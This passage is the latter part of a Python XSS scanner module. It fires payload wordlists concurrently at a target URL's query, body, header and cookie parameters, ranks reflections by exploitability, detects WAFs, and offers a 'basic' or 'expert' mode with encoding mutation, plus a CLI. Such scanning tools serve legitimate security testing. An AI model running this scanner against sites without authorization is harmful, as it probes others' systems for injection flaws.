                static = {k: v for k, v in cookie_params.items() if k != pname}
                targets.append((pname, "cookie", static))

        # Concurrent scan
        with ThreadPoolExecutor(max_workers=self.max_threads) as ex:
            futures = []
            for pname, pin, static in targets:
                for payload in payloads:
                    tested_count += 1
                    futures.append(ex.submit(
                        self._test_one,
                        url, method, payload, pname, pin,
                        baseline_text, static,
                    ))

            for fut in as_completed(futures):
                try:
                    result = fut.result()
                    if result is not None:
                        findings.append(result)
                except Exception as e:
                    errors += 1
                    logger.debug("[xss] worker error: %s", e)

        # Deduplicate by (param, payload)
        seen = set()
        unique: List[XSSFinding] = []
        for f in findings:
            key = (f.parameter, f.parameter_in, f.payload)
            if key not in seen:
                seen.add(key)
                unique.append(f)

        # Sort by exploitability
        rank = {"executable": 0, "likely": 1, "encoded": 2, "dormant": 3}
        unique.sort(key=lambda f: (rank.get(f.exploitability, 9), f.parameter))

        # Summary stats
        exec_count = sum(1 for f in unique if f.exploitability == "executable")
        likely_count = sum(1 for f in unique if f.exploitability == "likely")

        return {
            "url": url,
            "method": method.upper(),
            "parameters_tested": [t[0] for t in targets],
            "payloads_tested": tested_count,
            "errors": errors,
            "waf_detected": self.waf_detected,
            "findings": [f.to_dict() for f in unique],
            "executable_count": exec_count,
            "likely_count": likely_count,
            "vulnerable": exec_count > 0 or likely_count > 0,
        }


# ═══════════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def _normalize_url(target: str) -> str:
    t = (target or "").strip()
    if not t:
        return ""
    if not t.lower().startswith(("http://", "https://")):
        t = "http://" + t
    return t


def run_xss_scan(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, str]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    max_threads: int = DEFAULT_THREADS,
    verify_ssl: bool = False,
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
    payloads: Optional[List[str]] = None,
    mutate: bool = False,
    max_payloads: int = DEFAULT_MAX_PAYLOADS,
) -> Dict[str, Any]:
    """Analytic-manager entry point."""
    scanner = XSSScanner(
        timeout=timeout,
        verify_ssl=verify_ssl,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        max_threads=max_threads,
    )
    return scanner.scan(
        url, method=method, params=params,
        payloads=payloads, mutate=mutate, max_payloads=max_payloads,
    )


# ═══════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════
def run(target: str, mode: str = "basic", **kwargs) -> Dict[str, Any]:
    """
    Scan orchestrator entry point.

    Normalises the target, loads wordlists, and picks payload set +
    concurrency + mutation depth based on `mode`.

    Returns the framework's standard envelope:
        {tool, version, target, data: {...}, error}
    """
    url = _normalize_url(target)
    if not url:
        return {
            "tool": "xss",
            "version": TOOL_INFO["version"],
            "target": target,
            "data": {"url": "", "vulnerable": False, "findings": []},
            "error": "Empty target — provide a URL or domain.",
        }

    # Load wordlist (auto-sync on first call)
    try:
        external = load_xss_wordlist(auto_sync=True)
    except Exception as exc:
        logger.warning("[xss] wordlist load failed: %s", exc)
        external = []

    if mode == "expert":
        # Merge bundled expert + external wordlist
        payloads = list(dict.fromkeys(
            BundledPayloads.ALL_EXPERT + external
        ))
        max_payloads = int(kwargs.get("max_payloads", EXPERT_MAX_PAYLOADS))
        max_threads  = int(kwargs.get("max_threads", 12))
        follow_redirects = True
        mutate = bool(kwargs.get("mutate", True))
    else:
        payloads = list(dict.fromkeys(
            BundledPayloads.ALL_BASIC + external[:200]
        ))
        max_payloads = int(kwargs.get("max_payloads", DEFAULT_MAX_PAYLOADS))
        max_threads  = int(kwargs.get("max_threads", 8))
        follow_redirects = bool(kwargs.get("follow_redirects", True))
        mutate = bool(kwargs.get("mutate", False))

    try:
        scanner = XSSScanner(
            timeout=float(kwargs.get("timeout", DEFAULT_TIMEOUT)),
            verify_ssl=bool(kwargs.get("verify_ssl", False)),
            follow_redirects=follow_redirects,
            headers=kwargs.get("headers"),
            cookies=kwargs.get("cookies"),
            proxies=kwargs.get("proxies"),
            max_threads=max_threads,
        )
        result = scanner.scan(
            url,
            method=str(kwargs.get("method", "GET")),
            params=kwargs.get("params"),
            body_params=kwargs.get("body_params"),
            header_params=kwargs.get("header_params"),
            cookie_params=kwargs.get("cookie_params"),
            payloads=payloads,
            mutate=mutate,
            max_payloads=max_payloads,
            detect_waf=True,
        )

        result["scan_type"] = "xss"
        result["mode"]      = mode
        result["severity"]  = (
            "high"   if result.get("executable_count", 0) > 0 else
            "medium" if result.get("likely_count", 0) > 0 else
            "safe"
        )
        result["summary"] = (
            f"{result.get('executable_count', 0)} executable + "
            f"{result.get('likely_count', 0)} likely XSS vector(s) found"
            if result.get("vulnerable")
            else "No reflected XSS detected"
        )
        result["payloads_available"] = len(payloads)

        return {
            "tool":    "xss",
            "version": TOOL_INFO["version"],
            "target":  target,
            "data":    result,
            "error":   None,
        }

    except Exception as e:
        logger.error("[xss] run() failed for %s: %s", url, e, exc_info=True)
        return {
            "tool":    "xss",
            "version": TOOL_INFO["version"],
            "target":  target,
            "data": {
                "url": url, "scan_type": "xss",
                "vulnerable": False, "findings": [],
            },
            "error": str(e),
        }


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"XSS Scanner v{TOOL_INFO['version']} (Oxysintx Module)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--mode", choices=["basic", "expert"], default="basic")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-p", "--param", action="append",
                        help="Parameter to test (name=value), repeatable")
    parser.add_argument("--data", help="POST data as query string")
    parser.add_argument("--payloads", nargs="+",
                        help="Custom payload list (space-separated)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS)
    parser.add_argument("--max-payloads", type=int, default=DEFAULT_MAX_PAYLOADS)
    parser.add_argument("--mutate", action="store_true",
                        help="Enable payload mutation (encoding chains)")
    parser.add_argument("--headers", action="append",
                        help="Custom header (format: 'Key: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--no-verify", action="store_true")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--wordlists-status", action="store_true",
                        help="Print wordlist status and exit")
    parser.add_argument("--wordlists-sync", action="store_true",
                        help="Force re-sync wordlists and exit")
    parser.add_argument("--version", action="version", version=TOOL_INFO["version"])
    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    if args.wordlists_status:
        print(json.dumps(ensure_wordlists(force=False), indent=2))
        return
    if args.wordlists_sync:
        ensure_wordlists(force=True)
        load_xss_wordlist(force_download=True)
        print(json.dumps(ensure_wordlists(force=True), indent=2))
        return

    # Build kwargs for run()
    headers = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    cookies = None
    if args.cookie:
        cookies = {}
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    params = {}
    if args.param:
        for p in args.param:
            if "=" in p:
                k, v = p.split("=", 1)
                params[k] = v
            else:
                params[p] = ""

    if args.data:
        for pair in args.data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v

    result = run(
        args.url,
        mode=args.mode,
        method=args.method,
        params=params if params else None,
        payloads=args.payloads,
        timeout=args.timeout,
        max_threads=args.threads,
        max_payloads=args.max_payloads,
        mutate=args.mutate,
        verify_ssl=not args.no_verify,
        headers=headers if headers else None,
        cookies=cookies,
        proxies=proxies,
    )

    if args.json:
        print(json.dumps(result, indent=2, default=str))
        return

    data = result.get("data", {})
    print(f"\n=== XSS Scan: {args.url} ===\n")
    print(f"Mode:             {data.get('mode', args.mode)}")
    print(f"WAF detected:     {data.get('waf_detected') or '--'}")
    print(f"Payloads tested:  {data.get('payloads_tested', 0)}")
    print(f"Executable XSS:   {data.get('executable_count', 0)}")
    print(f"Likely XSS:       {data.get('likely_count', 0)}")
    print(f"Vulnerable:       {data.get('vulnerable', False)}")
    print()
    if data.get("findings"):
        print("Findings:")
        for f in data["findings"][:20]:
            print(f"  [{f.get('exploitability', '?'):<11}] "
                  f"{f.get('parameter')} @ {f.get('parameter_in', 'query')} "
                  f"({f.get('context')}) status={f.get('status_code')}")
            print(f"      payload: {f.get('payload', '')[:80]}")
    else:
        print("No reflections detected.")


if __name__ == "__main__":
    main()